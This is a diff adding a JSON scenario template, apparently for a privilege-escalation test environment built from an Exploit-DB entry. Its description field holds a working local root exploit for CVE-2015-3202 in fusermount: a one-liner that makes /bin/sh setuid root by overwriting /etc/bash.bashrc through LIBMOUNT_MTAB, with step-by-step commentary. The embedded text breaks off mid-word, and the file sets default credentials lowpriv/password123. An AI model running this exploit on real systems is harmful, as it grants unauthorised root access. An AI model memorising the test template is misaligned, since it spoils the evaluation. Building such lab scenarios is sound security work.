@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_37089",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Fuse 2.9.3-15 - Local Privilege Escalation (CVE-2015-3202;OSVDB-122415)\n\nExploit source code (37089.txt):\n```\nSource: https://gist.github.com/taviso/ecb70eb12d461dd85cba\nTweet: https://twitter.com/taviso/status/601370527437967360\nRecommend Reading: http://seclists.org/oss-sec/2015/q2/520\nYouTube: https://www.youtube.com/watch?v=V0i3uJJPJ88\n\n\n\n# Making a demo exploit for CVE-2015-3202 on Ubuntu fit in a tweet.\n\n12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\na=/tmp/.$$;b=chmod\\ u+sx;echo $b /bin/sh>$a;$b $a;a+=\\;$a;mkdir -p $a;LIBMOUNT_MTAB=/etc/$0.$0rc _FUSE_COMMFD=0 fusermount $a #CVE-2015-3202\n\n# Here's how it works, $a holds the name of a shellscript to be executed as\n# root.\na=/tmp/.$$;\n\n# $b is used twice, first to build the contents of shellscript $a, and then as\n# a command to make $a executable. Quotes are unused to save a character, so\n# the seperator must be escaped.\nb=chmod\\ u+sx;\n\n# Build the shellscript $a, which should contain \"chmod u+sx /bin/sh\", making\n# /bin/sh setuid root. This only works on Debian/Ubuntu because they use dash,\n# and dont make it drop privileges.\n#\n# http://www.openwall.com/lists/oss-security/2013/08/22/12\n#\necho $b /bin/sh>$a;\n\n# Now make the $a script executable using the command in $b. This needlessly\n# sets the setuid bit, but that doesn't do any harm.\n$b $a;\n\n# Now make $a the directory we want fusermount to use. This directory name is\n# written to an arbitrary file as part of the vulnerability, so needs to be\n# formed such that it's a valid shell command.\na+=\\;$a;\n\n# Create the mount point for fusermount.\nmkdir -p $a;\n\n# fusermount calls setuid(geteuid()) to reset the ruid when it invokes\n# /bin/mount so that it can use privileged mount options that are normally\n# restricted if ruid != euid. That's acceptable (but scary) in theory, because\n# fusermount can sanitize the call to make sure it's safe.\n#\n# However, because mount thinks it's being invoked by root, it allows\n# access to debugging features via the environment that would not normally be\n# safe for unprivileged users and fusermount doesn't sanitize them.\n#\n# Therefore, the bug is that the environment is not cleared when calling mount\n# with ruid=0. One debugging feature available is changing the location of\n# /etc/mtab by setting LIBMOUNT_MTAB, which we can abuse to overwrite arbitrary\n# files.\n#\n# In this case, I'm trying to overwrite /etc/bash.bashrc (using the name of the\n# current shell from $0...so it only works if you're using bash!).\n#\n# The line written by fusermount will look like this:\n#\n# /dev/fuse /tmp/.123;/tmp/.123 fuse xxx,xxx,xxx,xxx\n#\n# Which will try to execute /dev/fuse with the paramter /tmp/_, fail because\n# /dev/fuse is a device node, and then execute /tmp/_ with the parameters fuse\n# xxx,xxx,xxx,xxx. This means executing /bin/sh will give you a root shell the\n# next time root logs in.\n#\n# Another way to exploit it would be overwriting /etc/default/locale, then\n# waiting for cron to run /etc/cron.daily/apt at midnight. That means root\n# wouldn\n```",
+  "cve": "CVE-2015-3202;OSVDB-122415",
+  "exploitdb_id": "37089",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_37089",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
